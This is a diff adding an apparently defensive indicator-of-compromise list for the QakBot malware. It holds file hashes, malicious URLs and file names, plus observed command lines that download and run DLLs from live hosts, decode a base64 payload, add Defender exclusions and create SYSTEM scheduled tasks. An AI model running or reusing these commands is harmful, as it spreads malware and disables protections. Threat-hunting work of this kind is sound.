@@ -1,0 +1,176 @@
+ _________________________________________________________
+|                                                        |
+|    QakBot - https://attack.mitre.org/software/S0650    |
+|________________________________________________________|
+
+### ref: 
+https://github.com/pr0xylife/Qakbot/blob/main/Qakbot_tok01_15.02.2023.txt
+https://github.com/pr0xylife/Qakbot/blob/main/Qakbot_tok01_14.02.2023.txt
+https://github.com/pr0xylife/Qakbot/blob/main/Qakbot_obama_cs_24.02.2022.txt
+https://github.com/pr0xylife/Qakbot/blob/main/Qakbot_obama241_22.02.2023.txt
+https://github.com/pr0xylife/Qakbot/blob/main/Qakbot_BB15_17.02.2023.txt
+https://github.com/pr0xylife/Qakbot/blob/main/Qakbot_BB15_13.02.2023.txt
+https://github.com/pr0xylife/Qakbot/blob/main/Qakbot_BB16_20.02.2023.txt
+
+### file_hash:
+ 518518b0929911353cd7ab95d873e1fb290d8a494122cfb88e7f8bcf015576c8
+ 0dbc95d60b957669b5ae6e6977bae478738209fdb51dff780121320d6248b8e7
+ 0415ef433261d715e36a1d6497ebe78dd1fb7dcc45e018e5a95def1572e47272
+ 1fc89115c1f5d0aff030811ef827d60ba474819dcea5f4e53b9e3a2c3f29604a
+ 283fed02e9434975e43435a8748ab01451199a061da32e94e39128fd7745db24
+ 6f99171c95a8ed5d056eeb9234dbbee123a6f95f481ad0e0a966abd2844f0e1a
+ 7dd17b8cb0639732fe6929a5d7e1431fedae58acd401a7810afc0be8f9c42ad0
+ b91340d156582060095227e8d26f29f5ffc8b0e8fbf35a392b649adc60a5d4ab
+ be7e0c5b7566efa2d8b39bada9bd9e114f8ccc27c71327026f616e85bb2adb30
+ d53a72da6f43cc8b0a7adca3e397addfccfb1d6e9650184f76afc294b66f98a1
+ e16e0faae0e9851a782d026f6692e34a9c7bae14c545aa8ac1e1ef033dfd06a8
+ e99726f967f112c939e4584350a707f1a3885c1218aafa0f234c4c30da8ba2af
+ 7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a
+ 362e56855844fb2be3dfae4b566ab676f6ec681fad1c1a2e8eb6d245d56b83f5
+ 4a77f8bca1eb72556e1d9f1eeb2568a2d5c27a0a686d3c8e0635aefc7723144
+ 62072293339168c6296c56c17686172e4d3110c5ba25fe86c5cfa99765be8441
+ 6778c59a29e25d722230163bea272ece58d2d3696fbce4347c20104e8fb735dc
+ 7d84269a8ca5defbf09323180aca1ea7a26eea614fda04d3367c2fac2783a26c
+ 907e1edfdd6879afe9edde05b7afda3ceae6cecbb99588c31dcd4035447837fd
+ 997953548ccaf132f260b69dcd56dd56a2dc8028b4da3e6b99a2133ca2486039
+ f8360776618ae88f15187275a0222863ad44565568a71e02626a0ff351e3ef9a
+ b0e55ee7e05134855eb70ac1744370b78743818c106e389de7e0b614a2c37d2d
+ fe7c6af8a14af582c3f81749652b9c1ea6c0c002bb181c9ffb154eae609e6458
+ 1c7829f0316c7aeb94e0887bedf93e3667ab1283659bb1e3d5bcb2860d609ec1
+ 71805df6272036ba19ea6d4b91c03e9f7e11e2ab67e54724c0dba959c5392467
+ 1b3b1a86a4344b79d495b80a18399bb0d9f877095029bb9ead2fcc7664e9e89c
+
+### process_command:
+( del /q /f "%~f0" >nul 2>&1 & exit /b 0  )
+,msiexec.exe /I C:\Users\Admin\AppData\Local\Temp\362e56855844fb2be3dfae4b566ab676f6ec681fad1c1a2e8eb6d245d56b83f5.msi
+C:\Windows\SysWOW64\arp.exe arp -a
+C:\Windows\SysWOW64\cmd.exe cmd /c set
+C:\Windows\SysWOW64\explorer.exe
+C:\Windows\SysWOW64\ipconfig.exe ipconfig /all
+C:\Windows\SysWOW64\net.exe net localgroup
+C:\Windows\SysWOW64\net.exe net share
+C:\Windows\SysWOW64\net.exe net view /all
+C:\Windows\SysWOW64\net1.exe C:\Windows\system32\net1 localgroup
+C:\Windows\SysWOW64\net1.exe C:\Windows\system32\net1 share
+C:\Windows\SysWOW64\netstat.exe netstat -nao
+C:\Windows\SysWOW64\nslookup.exe nslookup -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.WORKGROUP
+C:\Windows\SysWOW64\regsvr32.exe -s "C:\Users\Admin\AppData\Local\Temp\283fed02e9434975e43435a8748ab01451199a061da32e94e39128fd7745db24.dll"
+C:\Windows\SysWOW64\route.exe route print
+C:\Windows\SysWOW64\whoami.exe whoami /all
+C:\Windows\system32\msiexec.exe C:\Windows\system32\msiexec.exe /V
+C:\Windows\system32\reg.exe ADD "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /f /t REG_DWORD /v "C:\ProgramData\Microsoft\Djqyxkquei" /d "0"
+C:\Windows\system32\reg.exe ADD "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /f /t REG_DWORD /v "C:\ProgramData\Microsoft\Mairrkitevaj" /d "0"
+C:\Windows\system32\reg.exe ADD "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /f /t REG_DWORD /v "C:\Users\Admin\AppData\Roaming\Microsoft\Bourfbyal" /d "0"
+C:\Windows\system32\reg.exe ADD "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /f /t REG_DWORD /v "C:\Users\Admin\AppData\Roaming\Microsoft\Eypqhosmv" /d "0"
+C:\Windows\system32\regsvr32.exe regsvr32.exe -s "C:\Users\Admin\AppData\Local\Temp\283fed02e9434975e43435a8748ab01451199a061da32e94e39128fd7745db24.dll"
+C:\Windows\system32\schtasks.exe" /Create /RU "NT AUTHORITY\SYSTEM" /tn izgntmfqgo /tr "regsvr32.exe -s \"C:\Users\Admin\AppData\Local\Temp\283fed02e9434975e43435a8748ab01451199a061da32e94e39128fd7745db24.dll\"" /SC ONCE /Z /ST 16:27 /ET 16:39
+C:\Windows\system32\schtasks.exe" /Create /RU "NT AUTHORITY\SYSTEM" /tn pkjjrwxj /tr "regsvr32.exe -s \"C:\Users\Admin\AppData\Local\Temp\283fed02e9434975e43435a8748ab01451199a061da32e94e39128fd7745db24.dll\"" /SC ONCE /Z /ST 16:32 /ET 16:44
+C:\Windows\system32\vssvc.exe
+EXCEL.EXE C:\Users\Admin\AppData\Local\Temp\1c7829f0316c7aeb94e0887bedf93e3667ab1283659bb1e3d5bcb2860d609ec1.xlsb
+ONENOTE.EXE C:\Users\Admin\AppData\Local\Temp\Contract_QE20(Feb22).one
+ONENOTE.EXE C:\Users\Admin\AppData\Local\Temp\contract 2.one
+ONENOTE.EXE C:\Users\Admin\AppData\Local\Temp\document.one
+ONENOTE.EXE C:\Users\Admin\AppData\Local\Temp\item.one
+Ru%132 %temp%\aTgzWLspf.tmp,Wind
+RunDLL32 C:\Users\Admin\AppData\Local\Temp\aTgzWLspf.tmp,Wind
+Rundll32  C:\programdata\aiaV7JT69.jpg,N115
+WScript.exe C:\Users\Admin\AppData\Local\Temp\Adobe Cloud Certificate 133337.wsf
+WScript.exe C:\Users\Admin\AppData\Local\Temp\OneNote\14.0\NT\0\O P E N.wsf
+WScript.exe C:\Users\Admin\AppData\Local\Temp\Open.jse
+WScript.exe C:\Users\Admin\AppData\Local\Temp\Open.wsf
+cmd /c ""C:\Users\Admin\AppData\Local\Temp\OneNote\14.0\NT\0\aNaUlv0y.bat" ndll"
+cmd /c start /min C:\Users\Admin\AppData\Local\Temp\i.cmd nd
+cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160223 -o %temp%\adeP1F.dll;start-process rundll32 %temp%\adeP1F.dll,N115"
+cmd,/c start /min powershell IWR -uri http://165.22.160.25/w9edb/160223 -o %temp%\adeP1F.dll;start-process rundll32 %temp%\adeP1F.dll,N115
+cmd.exe /K C:\Users\Admin\AppData\Local\Temp\i.cmd  nd
+cmd.exe /c " & "curl -o fd.dll http://64.225.8.202/1Moch7/160223 && rundll32 fd.dll,N115
+cmd.exe /c ""C:\Users\Admin\AppData\Local\Temp\default.bat nDLL
+cmd.exe /c "C:\Users\Admin\AppData\Local\Temp\O p e n.bat"
+cmd.exe /c C:\Users\Admin\AppData\Local\Temp\ngops.bat
+cmd.exe /c curl -o fd.dll http://64.225.8.202/1Moch7/160223 && rundll32 fd.dll,N115
+cmd.exe /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160223 -o %temp%\adeP1F.dll;start-process rundll32 %temp%\adeP1F.dll,N115
+cmd.exe/c C:\Users\Admin\AppData\Local\Temp\r.cmd
+echo hello, world!
+explorer.exe
+hh.exe C:\Users\Admin\AppData\Local\Temp\O P E N.chm
+msiexec.exe /V
+poweRshell  -C iwr 'http://baracundofres.com/images/150223.gif' -OutFile 'rei.dat'
+poweRshell -C Start-Sleep 11
+poweRshell -C Start-Sleep 12;rundll32 C:\ProgramData\lesian.dat,Wind
+poweRshell -C Start-Sleep 6;Start-Process 'C:\\ProgramData\\invoice.pdf
+poweRshell -C iwr http://waojernote.com/images/1.gif -OutFile C:\ProgramData\lesian.dat
+poweRshell -C iwr https://transfer.sh/get/vpiHmi/invoice.pdf -OutFile C:\\ProgramData\\invoice.pdf
+powershell  $aTKpRn = '0800fc577294c34e0b28ad2839435945';$adfTFyv = 'DQpAZWNobyBvZmYNCnBvd2Vyc2hlbGwuZXhlIGludm9rZS13ZWJyZXF1ZXN0IC11cmkgaHR0cHM6Ly9jYXN1YWxzY29sbGVjdGlvbi5jb20vbDJpeTREbi8wOS5naWYgLW8gQzpccHJvZ3JhbWRhdGFcYThxWnpUUy5qcGcNCnJ1JTFsbDMyIEM6XHByb2dyYW1kYXRhXGE4cVp6VFMuanBnLFdpbmQNCmV4aXQNCg==';[System.Text.Encoding]::ASCII.GetString([System.Convert]::('FromBase64String')($adfTFyv)) 
+powershell  IWR -uri http://165.22.160.25/w9edb/160223 -o C:\Users\Admin\AppData\Local\Temp\adeP1F.dll;start-process rundll32 C:\Users\Admin\AppData\Local\Temp\adeP1F.dll,N115
+powershell  iwr -uri http://104.236.1.43/YXF/150223.gif -o C:\Users\Admin\AppData\Local\Temp\aTgzWLspf.tmp
+powershell  iwr -uri http://193.57.138.12/400/113864.dat -o C:\programdata\aBeMU.jpg
+powershell  iwr -uri http://51.222.199.226/145/566647.dat -o C:\programdata\aiaV7JT69.jpg
+powershell  iwr -uri http://77.83.199.12/282/535806.dat -o C:\programdata\aQjwnYcJ.jpg
+powershell iwr -uri http://104.236.1.43/YXF/150223.gif -o %temp%\aTgzWLspf.tmp
+powershell.exe invoke-webrequest -uri https://casualscollection.com/l2iy4Dn/09.gif -o C:\programdata\a8qZzTS.jpg
+regsvr32  C:\a\Gertiokas1.ocx
+regsvr32.exe -n -i:"Install" C:\Users\Admin\AppData\Local\AdobeFontPack\main.dll
+regsvr32.exe -s "C:\Users\Admin\AppData\Local\Temp\283fed02e9434975e43435a8748ab01451199a061da32e94e39128fd7745db24.dll"
+rundll32 C:\ProgramData\Z6x9E9.SmcisaK,Wind
+rundll32 C:\programdata\a8qZzTS.jpg,Wind
+rundll32.exe C:\ProgramData\lesian.dat,Wind
+rundll32.exe C:\Users\Admin\AppData\Local\Temp\283fed02e9434975e43435a8748ab01451199a061da32e94e39128fd7745db24.dll,#1
+rundll32.exe" C:\Users\Admin\AppData\Local\Temp\adeP1F.dll N115
+rundll32.exe" rei.dat,Wind
+schtasks.exe" /Create /RU "NT AUTHORITY\SYSTEM" /Z /ST 01:39 /tn tzfmpldq /ET 01:50 /tr "powershell.exe -encodedCommand cgBlAGcAcwB2AHIAMwAyAC4AZQB4AGUAIAAiAEMAOgBcAFUAcwBlAHIAcwBcAEEAZABtAGkAbgBcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABBAGQAbwBiAGUARgBvAG4AdABQAGEAYwBrAFwAbQBhAGkAbgAuAGQAbABsACIA" /SC ONCE
+scrdec18-VC8.exe Open.jse Out.js
+srtasks.exe ExecuteScopeRestorePoint /WaitForRestorePoint:2
+taskeng.exe {DC717AEB-FBFE-43A2-9DE0-29BE60B3019B} S-1-5-18:NT AUTHORITY\System:Service:
+taskeng.exe {E499D8BD-D1AC-4BD1-A496-3C75F05A2680} S-1-5-18:NT AUTHORITY\System:Service:
+wscript.exe C:\Users\Admin\AppData\Local\AdobeFontPack\notify.vbs
+
+### url,dest_nt_domain:
+http://gkjdepok.org/crtfc/TsCw3rCG.dll
+http://64.225.8.202/1Moch7/160223
+http://mykitchenindonesia.com/crtfc/DgOr8LH4.dll
+http://165.22.160.25/w9edb/160223
+https://185.249.85.209/t4
+https://144.202.2.175/t4
+http://waojernote.com/images/1.gif
+http://185.81.113.214/44616.7186241898.dat
+http://67.43.234.56/44616.7186241898.dat
+http://23.106.124.9/44616.7186241898.dat
+http://185.81.113.214/44616.6382774305.dat
+http://67.43.234.56/44616.6382774305.dat"
+http://23.106.124.9/44616.6382774305.dat"
+http://185.81.113.214/44616.6382774305.dat
+http://67.43.234.56/44616.6382774305.dat
+http://23.106.124.9/44616.6382774305.dat
+dflow.icu
+http://165.22.160.25/w9edb/160223/adeP1F.dll
+https://osjovanmikic.edu.rs/DwJDgf7/130223/aJ1vC.dll
+http://147.182.206.33/FtFb/160223/aaSQMCd.dll
+http://64.225.8.202/1Moch7/160223/fd.dll
+https://gist.github.com/bcse/1834878
+https://casualscollection.com/l2iy4Dn/09.gif
+http://64.225.8.202/1Moch7/160223/fd.dll
+http://165.22.160.25/w9edb/160223/adeP1F.dll
+https://osjovanmikic.edu.rs/DwJDgf7/130223/aJ1vC.dll
+http://147.182.206.33/FtFb/160223/aaSQMCd.dll
+
+### file_name,file_path:
+133337.zip
+Feb14_Doc-682249.one 
+C:\a\Gertiokas1'.ocx
+C:\a\Gertiokas2.ocx
+C:\a\Gertiokas3.ocx
+KYC_CZ21(Feb15).one
+aaSQMCd.dll
+item.one
+adeP1F.dll
+aJ1vC.dll
+adeP1F.dl
+"C:\a"
+item.one
+document.one
+default.bat 
+contract 2.one
+item.one
+
+### other strings:
+28dc02bcd14a49b263705c4cf5fda85734d1f6d401b7ac34b9377610d0597cae
